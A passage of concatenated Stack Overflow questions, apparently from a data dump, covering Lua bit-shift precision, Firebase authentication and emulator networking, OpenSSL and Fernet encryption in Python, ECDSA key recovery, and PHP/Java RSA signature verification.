            a =(a - am) / m
            b =(b - bm) / m
            p = p * m
        end
        res = res +(a + b) * p
        return res
    end
    return bitop
end
 
local function make_bitop(t)
    local op1 = make_bitop_uncached(t, 2 ^ 1)
    local op2 = memoize( function(a) return memoize( function(b) return op1(a, b) end) end)
    return make_bitop_uncached(op2, 2 ^(t.n or 1))
end
 
local bxor1 = make_bitop( { [0] = { [0] = 0, [1] = 1 }, [1] = { [0] = 1, [1] = 0 }, n = 4 })
 
local function bxor(a, b, c, ...)
    local z = nil
    if b then
        a = a % MOD
        b = b % MOD
        z = bxor1(a, b)
        if c then z = bxor(z, c, ...) end
        return z
    elseif a then
        return a % MOD
    else
        return 0
    end
end
 
local function band(a, b, c, ...)
    local z
    if b then
        a = a % MOD
        b = b % MOD
        z =((a + b) - bxor1(a, b)) / 2
        if c then z = bit32_band(z, c, ...) end
        return z
    elseif a then
        return a % MOD
    else
        return MODM
    end
end
 
local function bnot(x) return(-1 - x) % MOD end
 
local function rshift1(a, disp)
    if disp &lt; 0 then return lshift(a, - disp) end
    return math.floor(a % 2 ^ 32 / 2 ^ disp)
end
 
local function rshift(x, disp)
    if disp &gt; 31 or disp &lt; -31 then return 0 end
    return rshift1(x % MOD, disp)
end
 
local function lshift(a, disp)
    if disp &lt; 0 then return rshift(a, - disp) end
    return(a * 2 ^ disp) % 2 ^ 32
end
 
local function rrotate(x, disp)
    x = x % MOD
    disp = disp % 32
    local low = band(x, 2 ^ disp - 1)
    return rshift(x, disp) + lshift(low, 32 - disp)
end
</code></pre>
<p>================================================================================
EDIT:<br />
Following the feedback, I would like to add some additional information. Since you're not certain that the algorithm only deals with 32-bit numbers, I have decided to monitor the bitshift operations to demonstrate otherwise. Here are the modifications made to capture the values used in the bitshift operations of this algorithm:</p>
<pre class=""lang-lua prettyprint-override""><code>lshift = function(a,b) print(&quot;a=[&quot;..a..&quot;] b=[&quot;..b..&quot;] - a &lt;&lt; b = [&quot;..(a &lt;&lt; b)..&quot;]&quot;)  return a &lt;&lt; b  end;
rshift = function(a,b) print(&quot;a=[&quot;..a..&quot;] b=[&quot;..b..&quot;] - a &gt;&gt; b = [&quot;..(a &gt;&gt; b)..&quot;]&quot;) return a &gt;&gt; b  end;
</code></pre>
<p>Results on a standard 5.4 lua environnement with <code>text=1234123412341234</code> and <code>secret32B=12345678123456781234567812345678</code>:</p>
<pre><code>[1] a=[926299444] b=[2] - a &gt;&gt; b = [231574861]
[2] a=[842086455] b=[4] - a &gt;&gt; b = [52630403]
[3] a=[892613426] b=[6] - a &gt;&gt; b = [13947084]
[4] a=[943142453] b=[8] - a &gt;&gt; b = [3684150]
[5] a=[858927412] b=[2] - a &gt;&gt; b = [214731853]
[6] a=[842085427] b=[4] - a &gt;&gt; b = [52630339]
[7] a=[825504562] b=[6] - a &gt;&gt; b = [12898508]
[8] a=[875770417] b=[8] - a &gt;&gt; b = [3420978]
[9] a=[10084375459231865] b=[26] - a &gt;&gt; b = [150268904]
[10] a=[6482263059657534] b=[26] - a &gt;&gt; b = [96593246]
[11] a=[2170453620770289] b=[26] - a &gt;&gt; b = [32342279]
[12] a=[2440835001604485] b=[26] - a &gt;&gt; b = [36371275]
[13] a=[3412223033429668] b=[26] - a &gt;&gt; b = [50846085]
[14] a=[271497234] b=[26] - a &gt;&gt; b = [4]
[15] a=[50524994] b=[26] - a &gt;&gt; b = [0]
[16] a=[17909233] b=[26] - a &gt;&gt; b = [0]
[17] a=[54122885] b=[26] - a &gt;&gt; b = [0]
[18] a=[30232228] b=[26] - a &gt;&gt; b = [0]
[19] a=[3061778] b=[26] - a &gt;&gt; b = [0]
[20] a=[3061783] b=[26] - a &gt;&gt; b = [0]
[21] a=[50524994] b=[26] - a &gt;&gt; b = [0]
[22] a=[17909233] b=[26] - a &gt;&gt; b = [0]
[23] a=[54122885] b=[26] - a &gt;&gt; b = [0]
[24] a=[4258090660] b=[31] - a &gt;&gt; b = [1]
[25] a=[50524994] b=[26] - a &lt;&lt; b = [3390674950946816]
[26] a=[50524994] b=[6] - a &gt;&gt; b = [789453]
[27] a=[17909233] b=[20] - a &lt;&lt; b = [18779191902208]
[28] a=[17909233] b=[12] - a &gt;&gt; b = [4372]
[29] a=[54122885] b=[14] - a &lt;&lt; b = [886749347840]
[30] a=[54122885] b=[18] - a &gt;&gt; b = [206]
[31] a=[30232228] b=[8] - a &lt;&lt; b = [7739450368]
[32] a=[1013049923] b=[32] - a &gt;&gt; b = [0]
[33] a=[2538816002] b=[32] - a &gt;&gt; b = [0]
[34] a=[2861859653] b=[32] - a &gt;&gt; b = [0]
[35] a=[1013049923] b=[8] - a &gt;&gt; b = [3957226]
[36] a=[3957226] b=[8] - a &gt;&gt; b = [15457]
[37] a=[15457] b=[8] - a &gt;&gt; b = [60]
[38] a=[60] b=[8] - a &gt;&gt; b = [0]
[39] a=[2538816002] b=[8] - a &gt;&gt; b = [9917250]
[40] a=[9917250] b=[8] - a &gt;&gt; b = [38739]
[41] a=[38739] b=[8] - a &gt;&gt; b = [151]
[42] a=[151] b=[8] - a &gt;&gt; b = [0]
[43] a=[2861859653] b=[8] - a &gt;&gt; b = [11179139]
[44] a=[11179139] b=[8] - a &gt;&gt; b = [43668]
[45] a=[43668] b=[8] - a &gt;&gt; b = [170]
[46] a=[170] b=[8] - a &gt;&gt; b = [0]
[47] a=[92658435] b=[8] - a &gt;&gt; b = [361947]
[48] a=[361947] b=[8] - a &gt;&gt; b = [1413]
[49] a=[1413] b=[8] - a &gt;&gt; b = [5]
[50] a=[5] b=[8] - a &gt;&gt; b = [0]
</code></pre>
<p>Inputs on my restricted env are the same, but the results mismatch on large numbers e.g <code>10084375459231865</code>. I guess it overflows ?</p>
<p>============================ EDIT2<br />
Results on my restricted environnement:</p>
<pre class=""lang-lua prettyprint-override""><code>[1] a=[926299444] b=[2] - a &gt;&gt; b = [231574861]
[2] a=[842086455] b=[4] - a &gt;&gt; b = [52630403]
[3] a=[892613426] b=[6] - a &gt;&gt; b = [13947084]
[4] a=[943142453] b=[8] - a &gt;&gt; b = [3684150]
[5] a=[858927412] b=[2] - a &gt;&gt; b = [214731853]
[6] a=[842085427] b=[4] - a &gt;&gt; b = [52630339]
[7] a=[825504562] b=[6] - a &gt;&gt; b = [12898508]
[8] a=[875770417] b=[8] - a &gt;&gt; b = [3420978]
[9] a=[1.0084375459232e+16] b=[26] - a &gt;&gt; b = [40]
[10] a=[6.4822629093887e+15] b=[26] - a &gt;&gt; b = [28]
[11] a=[2.1704535241771e+15] b=[26] - a &gt;&gt; b = [5]
[12] a=[2.4408349692622e+15] b=[26] - a &gt;&gt; b = [11]
[13] a=[3.4122229970584e+15] b=[26] - a &gt;&gt; b = [4]
[14] a=[17266828] b=[26] - a &gt;&gt; b = [0]
[15] a=[34473854] b=[26] - a &gt;&gt; b = [0]
[16] a=[55533743] b=[26] - a &gt;&gt; b = [0]
[17] a=[21780611] b=[26] - a &gt;&gt; b = [0]
[18] a=[60969828] b=[26] - a &gt;&gt; b = [0]
[19] a=[17266828] b=[26] - a &gt;&gt; b = [0]
[20] a=[17266833] b=[26] - a &gt;&gt; b = [0]
[21] a=[34473854] b=[26] - a &gt;&gt; b = [0]
[22] a=[55533743] b=[26] - a &gt;&gt; b = [0]
[23] a=[21780611] b=[26] - a &gt;&gt; b = [0]
[24] a=[4288828260] b=[31] - a &gt;&gt; b = [1]
[25] a=[34473854] b=[26] - a &lt;&lt; b = [4160749568]
[26] a=[34473854] b=[6] - a &gt;&gt; b = [538653]
[27] a=[55533743] b=[20] - a &lt;&lt; b = [183500800]
[28] a=[55533743] b=[12] - a &gt;&gt; b = [13558]
[29] a=[21780611] b=[14] - a &lt;&lt; b = [371245056]
[30] a=[21780611] b=[18] - a &gt;&gt; b = [83]
[31] a=[60969828] b=[8] - a &lt;&lt; b = [2723374080]
[32] a=[5053786813] b=[32] - a &gt;&gt; b = [758819517]
[33] a=[1886001423] b=[32] - a &gt;&gt; b = [1886001423]
[34] a=[3133030454] b=[32] - a &gt;&gt; b = [3133030454]
[35] a=[758819517] b=[8] - a &gt;&gt; b = [2964138]
[36] a=[2964138] b=[8] - a &gt;&gt; b = [11578]
[37] a=[11578] b=[8] - a &gt;&gt; b = [45]
[38] a=[45] b=[8] - a &gt;&gt; b = [0]
[39] a=[1886001423] b=[8] - a &gt;&gt; b = [7367193]
[40] a=[7367193] b=[8] - a &gt;&gt; b = [28778]
[41] a=[28778] b=[8] - a &gt;&gt; b = [112]
[42] a=[112] b=[8] - a &gt;&gt; b = [0]
[43] a=[3133030454] b=[8] - a &gt;&gt; b = [12238400]
[44] a=[12238400] b=[8] - a &gt;&gt; b = [47806]
[45] a=[47806] b=[8] - a &gt;&gt; b = [186]
[46] a=[186] b=[8] - a &gt;&gt; b = [0]
[47] a=[2504579774] b=[8] - a &gt;&gt; b = [9783514]
[48] a=[9783514] b=[8] - a &gt;&gt; b = [38216]
[49] a=[38216] b=[8] - a &gt;&gt; b = [149]
[50] a=[149] b=[8] - a &gt;&gt; b = [0]
</code></pre>
<p>As you can see, bitshift results are incorrect on large numbers</p>
<p>================= EDIT 3<br />
As you can see on both outputs line 9</p>
<ul>
<li>On lua 5.4: <code>[9] a=[10084375459231865] b=[26] - a &gt;&gt; b = [150268904]</code></li>
<li>On lua 5.1: <code>[9] a=[1.0084375459232e+16] b=[26] - a &gt;&gt; b = [40]</code></li>
</ul>
<p>On Lua 5.1, a double conversion is done, losing precision.
On Lua 5.4, the number is kept as a long number keeping the precision.</p>
<p>So for Lua 5.1 we actually have <code>10084375459232000</code> which is incorrect, as it should be <code>10084375459231865</code> (last 3 digits wiped and replaced by 0, and rounded)</p>
<p>Any idea to prevent this ?</p>
<p>============ EDIT 4</p>
<p>Still, <code>print(10084375459232000 &gt;&gt; 26)</code> on Lua 5.4 does <code>150268904</code> and not <code>40</code>, so it's not even related to precision. But more likely an issue with doubles ? I'm a bit confused now</p>
"
"<p>I have a Sveltekit app that uses Firebase for authentication and for Cloud Firestore. Running the app locally with the Firebase emulator, everything works. When deploying with Vercel, I have the server configured to use the Firebase service account, and the client has the client config as provided by Firesbase.</p>
<p>When I run the app for real, deployed via Vercel, I get the following behavior.</p>
<ol>
<li>When I use &quot;sign in with google&quot; functionality within my app, the app redirects to Google account selection and lets me select my google account</li>
<li>Checking the Firebase console, I see that I was successfully created within Authentication tab.</li>
<li>However, the Vercel app immediately bounces me back to my log-in screen. Examining the client console within Chrome I see the following error:</li>
</ol>
<blockquote>
<p>singletons-a6a7384f.js:259  GET <a href=""https://my-firebase-project.firebaseapp.com/__/firebase/init.json"" rel=""nofollow noreferrer"">https://my-firebase-project.firebaseapp.com/__/firebase/init.json</a> 404 (Not Found)</p>
</blockquote>
<p>I can confirm that the project name <code>my-firebase-project</code> in the url is correct and matches what is provided in the Firebase console as well as the config generated by Firebase.</p>
<p>In my package.json I am using</p>
<pre><code>                &quot;firebase&quot;: &quot;9.0.1&quot;,
                &quot;firebase-admin&quot;: &quot;^9.10.0&quot;,
</code></pre>
<p>Does anyone know what could be causing this error?</p>
"
"<p>I'm attempting to containerize my firebase emulator data:</p>
<p><code>Dockerfile.emulator</code></p>
<pre><code>FROM node:alpine

RUN apk add --no-cache \
  openjdk11-jre-headless \
  nodejs \
  npm \
  &amp;&amp; npm install -g firebase-tools


WORKDIR /app

COPY ./firebase.json firebase.json
# ... I copy other config files too, clipped for brevity

COPY ./emulator-data emulator-data

CMD [ &quot;firebase&quot;, &quot;--project=my-project&quot;, &quot;emulators:start&quot;, &quot;--only&quot;, &quot;firestore,auth,storage&quot;, &quot;--import&quot;, &quot;emulator-data&quot; ]

EXPOSE 4000
EXPOSE 8080
EXPOSE 9099
# I exposed all emulator ports, clipped for brevity
</code></pre>
<p>I also added <code>host</code> to each process in the <code>emulators</code> section from my <code>firebase.json</code>.</p>
<pre class=""lang-json prettyprint-override""><code>
  &quot;emulators&quot;: {
    &quot;singleProjectMode&quot;: false,
    &quot;auth&quot;: {
      &quot;port&quot;: 9099,
      &quot;host&quot;: &quot;0.0.0.0&quot;
    },
    &quot;firestore&quot;: {
      &quot;port&quot;: 8080,
      &quot;host&quot;: &quot;0.0.0.0&quot;
    },
    &quot;ui&quot;: {
      &quot;enabled&quot;: true,
      &quot;host&quot;: &quot;0.0.0.0&quot;,
      &quot;port&quot;: 4000
    }
  },
</code></pre>
<p>This runs successfully after executing my compose file</p>
<p><code>docker-compose.yml</code> (relevant sections)</p>
<pre class=""lang-yaml prettyprint-override""><code>version: '3.8'

services:
  emulator:
    container_name: emulator
    image: firestore
    build:
      context: .
      dockerfile: ./dockerfiles/Dockerfile.emulator
    ports:
      - 4000:4000
      - 8080:8080
      - 9099:9099
      # clipped for brevity, I exposed all emulator ports 

  data-api:
    container_name: data-api
    build:
      context: .
      dockerfile: ./apps/data-api/Dockerfile
    ports:
      - 3334:3334
    depends_on:
      - emulator
    env_file:
      - .env
    restart: always

</code></pre>
<p>Once running</p>
<ul>
<li>I can access the emulator UI on my local browser</li>
<li>the Authentication emulator shows &quot;ON&quot; on port 9099</li>
<li>the imported <code>emulator-data</code> is available.</li>
<li>I'm able to login and receive a firebase token from an angular application serving locally (network tab shows '127.0.0.1:9099')</li>
</ul>
<p>However, my API application (running in a docker container) needs to verify tokens and is having trouble connecting to the auth emulator.</p>
<blockquote>
<p>Error while making request: connect ECONNREFUSED 127.0.0.1:9099. Error code: ECONNREFUSED</p>
</blockquote>
<p>I also confirmed that I set the following environment variables (I also tried 0.0.0.0)</p>
<ul>
<li>process.env['FIRESTORE_EMULATOR_HOST'] = '127.0.0.1:8080'</li>
<li>process.env['FIREBASE_AUTH_EMULATOR_HOST'] = '127.0.0.1:9099'</li>
</ul>
<p>This same configuration works when I run the emulator and API applications locally, so I think it has something to with containers and not the connection information in my API application.</p>
<p><strong>Is there a reason why my <code>data-api</code> container cannot talk to the <code>emulator</code> container even when my locally run frontend can? Have I configured the ports incorrectly? Aren't these apps both on the same, default network?</strong></p>
"
"<p>i am building a react-native app and there i want to add phone authentication i have done all the setup for integrating with firebase and i also added sha-1, sha-256 fingerprint in the firebase project and after i have downloaded the updated google-services.json file in the android/app folder and also enabled the play integrity but still i am getting the error.</p>
<p>Error sending OTP: [Error: [auth/app-not-authorized] This app is not authorized to use Firebase Authentication. Please verify that the correct package name, SHA-1, and SHA-256 are configured in the Firebase Console. [ Invalid app info in play_integrity_token ]]</p>
"
"<p>I have a python script with functions for generating keys, signing messages, encrypting and decrypting them.</p>
<pre><code>def gen_keys(key_name):
    result1 = subprocess.call([
        'openssl', 'genpkey', '-algorithm', 'RSA', '-provider-path',
        '/usr/lib/x86_64-linux-gnu/ossl-modules', '-provider', 'legacy',
        '-out', f'{key_name}_private_key.pem'
    ])
    result2 = subprocess.call([
        'openssl', 'pkey', '-pubout', '-in',
        f'{key_name}_private_key.pem', '-out', f'{key_name}_public_key.pem'
    ])
    if result1 != 0 or result2 != 0:
        print(f&quot;Error gen {key_name} keys&quot;)
        return False
    return True
def sign_message(key_name, message):
    with open('message.txt', 'w') as file:
        file.write(message)
    result = subprocess.call([
        'openssl', 'dgst', '-sha256', '-sign',
        f'{key_name}_private_key.pem', '-out', 'signature.sig', 'message.txt'
    ])
    if result != 0:
        print(f&quot;Error signing message with {key_name}'s private key&quot;)
        return False
    return True


def verify_signature(key_name, message_path, signature_path):
    result = subprocess.call([
        'openssl', 'dgst', '-sha256',
        '-verify', f'{key_name}_public_key.pem', '-signature',
        signature_path, message_path
    ])
    return result == 0


def encrypt_message(key_name, message_path, encrypted_message_path):
    result = subprocess.call([
        'openssl', 'cms', '-encrypt', '-in', message_path,
        '-out', encrypted_message_path, '-recip', f'{key_name}_public_key.pem',
        '-keyopt', 'rsa_padding_mode:oaep', '-cipher', 'aes-256-cbc'
    ])
    if result != 0:
        print(f&quot;Error encrypting message with {key_name}'s public key&quot;)
        return False
    return True


def decrypt_message(key_name, encrypted_message_path, decrypted_message_path):
    result = subprocess.call([
        'openssl', 'cms', '-decrypt', '-in', encrypted_message_path, '-out',
        decrypted_message_path, '-recip', f'{key_name}_private_key.pem'
    ])
    if result != 0:
        print(f&quot;Error decrypting message with {key_name}'s private key&quot;)
        return False
    return True
</code></pre>
<p>Then I use keys for verifying signatures, decrypting and encrypting messages, but I get this error:</p>
<pre><code>Verified OK
Verified OK
Could not read recipient certificate file from client_private_key.pem
4027E61AB47F0000:error:1608010C:STORE routines:ossl_store_handle_load_result:unsupported:../crypto/store/store_result.c:151:
Unable to load recipient certificate file
Error decrypting message with client's private key
Could not read recipient certificate file from server_private_key.pem
40575BD9937F0000:error:1608010C:STORE routines:ossl_store_handle_load_result:unsupported:../crypto/store/store_result.c:151:
Unable to load recipient certificate file
Error decrypting message with server's private key
</code></pre>
<p>I checked if files are in path (they are), I have full access to them. So I don't know why I always receiving error like this, but I'm not an expert in OpenSSL</p>
"
"<p>When I sign out if Firebase in the flutter application the Microsoft account still stays signed-in</p>
<p>I know that the reason for this is that Firebase only signs me out of Firebase but not Microsoft , For Google I can use <code>googleSignIn.signOut();</code> to get the expected result but I cant find something similar for Microsoft. If there isn't, is there another way to do this? I tried going through the MSAL documentation but I couldn't find something that works with firebase</p>
<p>Here is my current sign out function</p>
<pre><code>signOut() async {
    try {
      String providerId =
          FirebaseAuth.instance.currentUser?.providerData[0].providerId ?? &quot;&quot;;
      switch (providerId) {
        case 'password':
          await FirebaseAuth.instance.signOut();
          break;
        case 'google.com':
          final GoogleSignIn googleSignIn = GoogleSignIn();
          await googleSignIn.signOut();
          break;
        case 'microsoft.com':
          await FirebaseAuth.instance.signOut();
          break;
      }
    } on FirebaseAuthException catch (e) {
      devtools.log(e.toString());
    }
  }
</code></pre>
"
"<p>Everytime i get this in my console:
`</p>
<pre><code>W/LocalRequestInterceptor( 5199): Error getting App Check token; using placeholder token instead. Error: com.google.firebase.FirebaseException: No AppCheckProvider installed.
D/FirebaseAuth( 5199): Notifying id token listeners about user ( vf7HKywcZTU... ).

</code></pre>
<p>My Flutter App auto navigates to the Homepage.
I am using GetX for navigation and using Firebase for Authentication.
This happens after a period of time when the app is either in use or just not in use but opened.</p>
<p>Then after going to the homepage, it displays this message:</p>
<pre><code>I/companyname.appname( 5199): Background young concurrent copying GC freed 665534(17MB) AllocSpace objects, 20(6032KB) LOS objects, 15% free, 127MB/150MB, paused 11.945ms total 335.119ms
W/companyname.appname( 5199): Reducing the number of considered missed Gc histogram windows from 135 to 100
</code></pre>
<p>This is my Auth Controller class.
`</p>
<pre><code>class Auth extends GetXController{
  static AuthController instance = Get.find();
  final StudentController student = Get.put(StudentController());
  late Rx&lt;User?&gt; _user;
  FirebaseAuth auth = FirebaseAuth.instance;

  @override
  void onInit() {
    super.onInit();
    _user = Rx&lt;User?&gt;(auth.currentUser);
    _user.bindStream(auth.userChanges());

    ever(_user, _initialScreen);
  }

  _initialScreen(User? user) async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    final finishedOnboarding = prefs.getBool('finishedOnboarding') ?? false;
    if (finishedOnboarding) {
      if (FirebaseAuth.instance.currentUser != null) {
        Get.offAll(() =&gt; const HomeScreen());
      } else {
        Get.offAll(() =&gt; const LoginView());
      }
    } else {
      Get.offAll(const OnboardingView());
    }
  }
}
</code></pre>
<p>Where could I be going wrong?
I am suspecting a network issue, maybe the navigation? or maybe incopatibility issues?
My dependencies are:</p>
<pre><code>  firebase_core: ^2.9.0
  firebase_auth: ^4.4.0
  get: ^4.6.6

</code></pre>
<p>I have tried changing my navigation logic to use the default Flutter <code>Navigator.of(context).push</code> as I only relied on GetX to handle Navigation. eg: <code>Get.to(()=&gt;SomePage());</code></p>
"
"<p>Let's say we have this code to sign a simple transaction in <strong>Ethereum</strong> and then verify the signature, using the <a href=""https://en.bitcoin.it/wiki/Elliptic_Curve_Digital_Signature_Algorithm"" rel=""nofollow noreferrer"">Elliptic Curve Digital Signature Algorithm (ECDSA)</a>, just like in real life:</p>
<pre><code>const { secp256k1 } = require(&quot;ethereum-cryptography/secp256k1&quot;);
const { keccak256 } = require(&quot;ethereum-cryptography/keccak&quot;);
const { toHex, utf8ToBytes } = require(&quot;ethereum-cryptography/utils&quot;);

const privateKey = secp256k1.utils.randomPrivateKey();
console.log('private key :  ', toHex(privateKey));

const publicKey = secp256k1.getPublicKey(privateKey);
console.log('public key  :', toHex(publicKey));

const data = &quot;hello world!&quot;;
const hash = keccak256(utf8ToBytes(data));
const signature = secp256k1.sign(hash, privateKey);
console.log(&quot;Signing data   :&quot;, data);
</code></pre>
<p>Then I send the <code>data</code> and <code>signature</code> through the network and use this code to retrieve the public key and verify the signature:</p>
<pre><code>const pkRecovered = signature.recoverPublicKey(hash).toRawBytes();
console.log(&quot;honest verification   :&quot;, {data: data, signature: &quot;...&quot;});
console.log('recovery    :', toHex(publicKey) === toHex(pkRecovered));                // true  
console.log('verification:', secp256k1.verify(signature, hash, pkRecovered));         // true
</code></pre>
<p>So far so good.</p>
<p>But what if I (<a href=""https://en.wikipedia.org/wiki/Man-in-the-middle_attack"" rel=""nofollow noreferrer"">or someone in the middle</a>) change the transaction data? You would expect the signature verification to fail, but it retrieves a different public key and the verification is successful.</p>
<pre><code>const dataEvil = &quot;modified&quot;;
const hashEvil = keccak256(utf8ToBytes(dataEvil));
const pkRecoveredEvil = signature.recoverPublicKey(hashEvil).toRawBytes();
console.log(&quot;malicious verification:&quot;, {data: dataEvil, signature: &quot;the same&quot;});
console.log('recovery    :', toHex(publicKey) === toHex(pkRecoveredEvil));            // false
console.log('verification:', secp256k1.verify(signature, hashEvil, pkRecoveredEvil)); // true... why?
</code></pre>
<p>It doesn't seem right to me, but I can't figure out what I'm doing wrong.</p>
"
"<p>I am using the Python <a href=""https://cryptography.io/en/latest/"" rel=""nofollow noreferrer"">cryptography</a> package to generate encryption data. I can generate an encryption token no problem, like this:</p>
<pre><code>b'gAAAAABl4-BVigmotWHPCxDKkGT-weDwK0DcdiHyW9U8rthD2B61dTCQw1Gnt7JcyCvWmxW2INNws_hbK1ecReEaqJKEaXJCZg=='
</code></pre>
<p>I can then use that to successfully decrypt my data using that same cryptography package.</p>
<p>I want to decrypt my data using a different package (a JavaScript package), so I need to extract the IV and cipher text from that token. However, I'm running into issues, since Base64 tokens like that are not supposed to contain hyphens nor underscores. By strictly following the <a href=""https://github.com/fernet/spec/blob/master/Spec.md"" rel=""nofollow noreferrer"">fernet spec</a>, the IV should be this:</p>
<pre><code>b'igmotWHPCxDKkGT-weDwKw=='
</code></pre>
<p>However, when I put that into my JavaScript package, it's rejected, since Base64 encoded data cannot have hyphens. Are the hyphens and underscores supposed to be replaced with something else?</p>
<p>Notes:</p>
<ul>
<li>According to the <a href=""https://github.com/fernet/spec/blob/master/Spec.md#token-format"" rel=""nofollow noreferrer"">fernet spec</a>, the token should have <code>57 + 16x</code> bytes (<code>456 + 128x bits</code>), so 73 bytes, 89 bytes, etc. According to <code>len(base64.urlsafe_b64decode(token))</code> (where <code>token</code> stores the token above), my token has 73 bytes, so that appears to be fine.</li>
<li>To get the IV above, I am using <code>urlsafe_b64encode(urlsafe_b64decode(token)[9:25])</code>. Using the <code>urlsafe</code> version was inspired by <a href=""https://stackoverflow.com/a/55106160/10368970"">this</a>. I was using <code>b64edecode()</code>, but I would sometimes (but not always) get the error <code>binascii.Error: Invalid base64-encoded string: number of data characters (93) cannot be 1 more than a multiple of 4</code>.</li>
</ul>
"
"<pre><code> def encrypt(self):
        if not os.path.exists(self.filename):
            raise Exception('File does not exist!')

        # Generate a random salt
        salt = Fernet.generate_key()

        # Calculate the HMAC of the salt using the key
        hmac_digest = hmac.new(self.key, salt, hashlib.sha256).digest()

        # Encrypt the data with the salt and key
        fernet = Fernet(salt + self.key)
        with open(self.filename, 'rb') as file:
            file_data = file.read()
        encrypted_data = fernet.encrypt(file_data)

        # Write the encrypted data to the file
        with open(self.filename, 'wb') as file:
            file.write(encrypted_data)

     

 def decrypt(self):
        if not os.path.exists(self.filename):
            raise Exception('File does not exist!')

        # Read the salt and HMAC digest from the separate file
        with open(self.filename + '.salt', 'rb') as file:
                k_sz = Fernet.key_size
                salt = file.read(k_sz)
                hmac_digest = file.read(hashlib.sha256().digest_size)
</code></pre>
<p>here in the decrypt function i am trying to get the salt and hmac value stored in the encrypted file. But receiving the error</p>
<pre><code> File &quot;C:\python programs\test2.py&quot;, line 61, in decrypt
    k_sz = Fernet.key_size
           ^^^^^^^^^^^^^^^
AttributeError: type object 'Fernet' has no attribute 'key_size'
</code></pre>
<p>i have tried .KEY_SIZE and Fernet(key=None).key_size then it says key value as none not expected</p>
"
"<p>I am using php openssl to sign and verify data.</p>
<p>For signing I have the following code:</p>
<pre><code>$private_key='-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAqQU5C68MxLy5PD9P/UxDj4TlEBe4AuXJsNb66ZJodZJQWzba
...
k8cnntx7q7KVanpy1Gm4YMHPuskw9kvevMqpG+JycwjGq5Rk6Ss=
-----END RSA PRIVATE KEY-----
';
$text='BE1002|20240226201949|405700076195|20240226203753|06||AC|681708957177|BNBL||5800.0|IN';
openssl_sign($text, $signature, $private_key,OPENSSL_ALGO_SHA1);
$signature=bin2hex($signature);
$signature=strtoupper($signature);
</code></pre>
<p>This Outputs Sign in hexadecimal format which is verified on the java side and I get a response data as below which I am unable to verify using php openssl</p>
<pre><code>$data='B00202|20240226201949|405700076195|20240226203753|06||AC|681708957177|BY||90.0|IN';

$signed='3DDA6FD0EFE0F1031E391B214977A7C6CBD57151E39F42EA3AC20A77E1924FABA829CCFE8222F4C42052843F1FBADC8BD038BE3AD744B1788550A17734974516D0F70896ABA8F09D0F359D0FD2CB14DD41ED532F1BAF27ABCF0F70B8A15FB263718AB088DFCE14497097921C7B655A9C1D5AEE3404C39CCB11244314D76917A42F6EE6064910F9AD0B1432363D98931DB4059EBCF04A481D3BA9B290EFA5EED98BA576623F1F45CAF182D1697EEBD044E362BA6ACCC2BC76C2BC385E8B65F90419317E3FFBFA5CB8A68859C90D3A4F9E0313186E78FEEFCEA74C7482932E7CDEC9C7F771F59B39DB42855183E91B67164C37B391E8340E8FEE07A2BDD11B8366';

$crt='-----BEGIN CERTIFICATE-----
MIIENzCCAx+gAwIBAgIGEmiK5GVbMA0GCSqGSIb3DQEBCwUAMHgxDzANBgNVBAYT
...
-----END CERTIFICATE-----
';

$signed=hex2bin($signed);

$verified = openssl_verify($data, $signed, $crt, OPENSSL_ALGO_SHA1);
echo $verified;
</code></pre>
<p>Below is the Java implementation class where I am sending the data</p>
<pre><code>package com.bsf.util;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.Reader;
import java.security.InvalidKeyException;
import java.security.KeyPair;
import java.security.NoSuchAlgorithmException;
import java.security.NoSuchProviderException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.Security;
import java.security.Signature;
import java.security.SignatureException;
import java.security.cert.CertificateException;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.security.interfaces.RSAPublicKey;
import java.security.spec.InvalidKeySpecException;
import java.text.ParseException;
import java.util.StringTokenizer;

import org.bouncycastle.jce.provider.BouncyCastleProvider;
import org.bouncycastle.openssl.PEMReader;


public class BFSPKIImplementation {

    static {
        Security.addProvider(new BouncyCastleProvider());
    }

    public static String signData(String pvtKeyFileName, String dataToSign,
            String signatureAlg) throws IOException, NoSuchAlgorithmException,
            NoSuchProviderException, InvalidKeyException, SignatureException {

        PrivateKey privateKey = getPrivateKey(pvtKeyFileName);
        Signature signature = Signature.getInstance(signatureAlg, &quot;BC&quot;);
        signature.initSign(privateKey);

        signature.update(dataToSign.getBytes());
        byte[] signatureBytes = signature.sign();

        return byteArrayToHexString(signatureBytes);

    }
    
    
    public static boolean verifyData(String pubKeyFileName,
            String checkSumStr, String checkSumFromMsg,
            String signatureAlg) throws NoSuchAlgorithmException, InvalidKeyException, SignatureException, NumberFormatException, CertificateException, IOException, ParseException 
      {
       Signature sig=null;
       PublicKey pubKey = getBFSPublicKey(pubKeyFileName);
        sig = Signature.getInstance(&quot;SHA1withRSA&quot;);
        sig.initVerify(pubKey);
        sig.update(checkSumStr.getBytes());
        return sig.verify(HexStringToByteArray(checkSumFromMsg));
      }



    private static PublicKey getPublicKey(X509Certificate X509Cert)
    {
        return (RSAPublicKey) X509Cert.getPublicKey();
    }

    private static PrivateKey getPrivateKey(String pvtKeyFileName)
            throws IOException {
        FileReader pvtFileReader = getPVTKeyFile(new File(pvtKeyFileName));
        PEMReader pvtPemReader = getPvtPemReader(pvtFileReader);
        KeyPair keyPair = (KeyPair) pvtPemReader.readObject();

        pvtFileReader.close();
        pvtFileReader = null;
        pvtPemReader.close();
        pvtPemReader = null;
        return keyPair.getPrivate();
    }

    private static FileReader getPVTKeyFile(File pvtFile) {
        FileReader pvtFileReader = null;
        try {
            pvtFileReader = new FileReader(pvtFile);
        } catch (FileNotFoundException e) {

            e.printStackTrace();
            pvtFileReader = null;
        }

        return pvtFileReader;
    }

    private static PEMReader getPvtPemReader(Reader pvtFile) {
        return new PEMReader(pvtFile);
    }

    static char[] hexChar = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
            'A', 'B', 'C', 'D', 'E', 'F' };

    public static String byteArrayToHexString(byte b[]) {
        StringBuffer sb = new StringBuffer(b.length * 2);
        for (int i = 0; i &lt; b.length; i++) {
            sb.append(hexChar[(b[i] &amp; 0xf0) &gt;&gt;&gt; 4]);
            sb.append(hexChar[b[i] &amp; 0x0f]);
        }
        return sb.toString();
    }

    public static byte[] HexStringToByteArray(String strHex) {
        byte bytKey[] = new byte[(strHex.length() / 2)];
        int y = 0;
